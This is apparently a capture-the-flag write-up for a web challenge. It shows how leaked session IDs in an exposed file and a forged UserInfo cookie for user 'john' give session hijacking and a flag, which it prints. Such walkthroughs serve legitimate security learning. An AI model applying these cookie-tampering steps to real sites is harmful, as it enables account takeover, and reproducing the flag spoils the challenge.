# The Restricted Sessions

<img width="1193" height="291" alt="image" src="https://github.com/user-attachments/assets/d6db2162-20d1-48e8-9f2f-9edc17084336" />

## found in sourse code

```javascript
if(document.cookie !== ''){
        $.post('getcurrentuserinfo.php',{
          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
        },function(data){
          cu = data;
        });
      }
```

> ## edit cookie

```
PHPSESSID : [^;]+)/
```

<img width="1918" height="300" alt="image" src="https://github.com/user-attachments/assets/fdfa52b5-a47b-440e-ae74-70d2aa68418f" />

```
/data/session_store.txt
```

<img width="767" height="192" alt="image" src="https://github.com/user-attachments/assets/cbc10dd5-2b75-4f36-97e3-77e733ee78a0" />

```
iuqwhe23eh23kej2hd2u3h2k23
11l3ztdo96ritoitf9fr092ru3
ksjdlaskjd23ljd2lkjdkasdlk
```

> ## edit cookie again

```
PHPSESSID : iuqwhe23eh23kej2hd2u3h2k23
```

<img width="1614" height="366" alt="image" src="https://github.com/user-attachments/assets/20fdb1cc-32b0-4da5-933f-6d4997c4d1f8" />

```
UserInfo Cookie don't have the username , Validation failed 
```

> ## in sourse code 

```javascript
 $.post('getcurrentuserinfo.php',{
```

```
/getcurrentuserinfo.php
```

<img width="1184" height="444" alt="image" src="https://github.com/user-attachments/assets/6426035e-6f85-473b-b3c3-6a197f2dd813" />

> ## we get the name **`john`**

> ## edit cookie again

```
PHPSESSID : iuqwhe23eh23kej2hd2u3h2k23
UserInfo : john
```

<img width="1504" height="353" alt="image" src="https://github.com/user-attachments/assets/d8b42311-31cb-423f-b9c4-d020a87d846d" />

```
sessionareawesomebutifitsecure
```

